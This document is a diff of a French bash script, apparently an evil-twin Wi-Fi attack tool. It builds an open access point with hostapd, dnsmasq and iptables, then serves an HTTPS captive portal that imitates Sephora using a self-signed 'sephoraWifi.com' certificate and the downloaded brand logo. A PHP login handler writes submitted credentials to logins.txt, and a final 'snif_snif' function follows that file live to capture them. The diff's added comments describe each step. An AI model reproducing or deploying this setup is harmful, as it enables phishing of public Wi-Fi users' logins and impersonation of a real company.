@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Variables
+# Déclaration des Variables nécéssaires
 WIFI_IFACE="wlan0"
 ETH_IFACE="eth0"
 WIFI_IP="192.168.1.1"
@@ -10,7 +10,9 @@ DHCP_RANGE_END="192.168.1.200"
 DHCP_LEASE_TIME="12h"
 
 ip_configuration () {
-    
+# Cette fonction permet de configurer l'interface wifi en mode AP, mais aussi de configurer l'interface ethernet en IP statique. 
+# Enfin elle active l'IP forwarding.
+
     echo "[+] Création de l'Access Point..."
 
     echo "[+] Configuration de $WIFI_IFACE avec IP statique."
@@ -26,6 +28,10 @@ ip_configuration () {
 }
 
 ip_table () {
+
+# Cette fonction configure les règles iptables pour le NAT et le forwarding,
+# elle installe également iptables-persistent pour sauvegarder les règles.
+
     echo "[+] Configuration des règles iptables..."
     iptables --flush
     iptables --table nat --flush
@@ -42,7 +48,8 @@ ip_table () {
 
 
 dnsmasq_configuration (){
-    # 4 Configure dnsmasq (DHCP + DNS)
+# Configure dnsmasq (DHCP + DNS)
+
     echo "[+] Configuration dnsmasq..."
     cat > /etc/dnsmasq.conf <<EOL
 interface=$WIFI_IFACE
@@ -56,10 +63,13 @@ log-queries
 log-dhcp
 EOL
     systemctl restart dnsmasq
+
 }
 
 
 hostapd_configuration () {
+# Cette fonction configure hostapd (Access Point) et active le service
+
     echo "[+] Configuration hostapd..."
     cat > /etc/hostapd/hostapd.conf <<EOL
 interface=$WIFI_IFACE
@@ -69,15 +79,18 @@ hw_mode=g
 channel=7
 wpa=0
 EOL
-    sed -i 's|^#DAEMON_CONF=.*|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd
+    sed -i 's|^#DAEMON_CONF=.*|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd 
 }
 
 certificat_generation () {
+# Cette fonction génère un certificat SSL auto-signé pour le portail captif
+
     echo "[+] Génération du certificat SSL auto-signé..."
     openssl req -newkey rsa:2048 -nodes -keyout /etc/ssl/private/captive.key -x509 -days 365 -out /etc/ssl/certs/captive.crt -subj "/C=FR/ST=Paris/L=Paris/O=WiFi Public/CN=sephoraWifi.com"
 }
 
 set_captive_portal_html () {
+# Cette fonction configure le portail captif (HTML) qui sera affiché aux utilisateurs lors de la connexion
 
     echo "[+] Configuration du portail captif..."
     mkdir -p /var/www/html/
@@ -115,6 +128,7 @@ EOF
 }
 
 set_captive_portal_php () {
+# Cette fonction configure le script PHP qui sera exécuté lors de la soumission du formulaire de connexion
 
     cat <<'EOF' > /var/www/html/login.php
     <?php
@@ -169,19 +183,19 @@ EOF
 
 
 pull_image () {
+# Cette fonction télécharge une image de logo pour le portail captif et la déplace dans le répertoire /var/www/html/
 
     # Définition des variables
     FILE="/var/www/html/logo.png"
     URL="https://logo-marque.com/wp-content/uploads/2022/02/Sephora-Logo.png"
 
-    # Vérifier si le fichier existe
+
     if [ -f "$FILE" ]; then
         echo "Le fichier existe déjà : $FILE"
     else
         echo "Le fichier n'existe pas. Téléchargement en cours..."
         curl -o logo.png "$URL"
 
-        # Vérifier si le téléchargement a réussi
         if [ -f "logo.png" ]; then
             echo "Téléchargement réussi, déplacement du fichier..."
             sudo mv logo.png "$FILE"
@@ -194,6 +208,7 @@ pull_image () {
 }
 
 set_captive_portal_permissions () {
+# Cette fonction configure les permissions des fichiers du portail captif
 
     touch /var/www/html/logins.txt
     chown www-data:www-data /var/www/html/logins.txt
@@ -204,6 +219,7 @@ set_captive_portal_permissions () {
 }
 
 apache_configuration () {
+# Cette fonction configure Apache pour servir le portail captif en HTTPS (port 443)
 
     echo "[+] Configuration Apache pour HTTPS..."
     a2enmod ssl
@@ -232,6 +248,8 @@ EOF
 }
 
 set_apache_redirection () {
+# Cette fonction configure Apache pour rediriger le trafic HTTP vers HTTPS (port 80 -> 443)
+
     echo "[+] Activation de la redirection HTTP -> HTTPS..."
     cat <<EOF > /etc/apache2/sites-available/000-default.conf
     <VirtualHost *:80>
@@ -242,6 +260,7 @@ EOF
 }
 
 set_hosts () {
+# Cette fonction configure le fichier /etc/hosts pour résoudre localement le nom d'hôte sans avoir à consulter un serveur DNS externe. 
 
     cat <<EOF > /etc/hosts
 127.0.0.1       localhost
@@ -257,11 +276,13 @@ EOF
 }
 
 big_restart () {
+# Cette fonction redémarre les services nécessaires pour appliquer les modifications
+
     echo "[+] Redémarrage des services"
     systemctl restart apache2
 
     systemctl unmask hostapd
-    systemctl enable hostapd
+#   systemctl enable hostapd
     systemctl restart hostapd
 
     systemctl enable dnsmasq
@@ -272,6 +293,8 @@ big_restart () {
 }
 
 snif_snif () {
+# Cette fonction permet de lancer le snif de credentials en suivant le fichier logins.txt en temps réel
+
     echo "[+] L'Access point est enfin pret !"
 
     echo "Debut du snif de Credentials : "
@@ -279,6 +302,8 @@ snif_snif () {
 }
 
 main () {
+# Cette fonction appelle toutes les fonctions pour configurer l'Access Point de A à Z
+
     ip_configuration
     ip_table
     dnsmasq_configuration
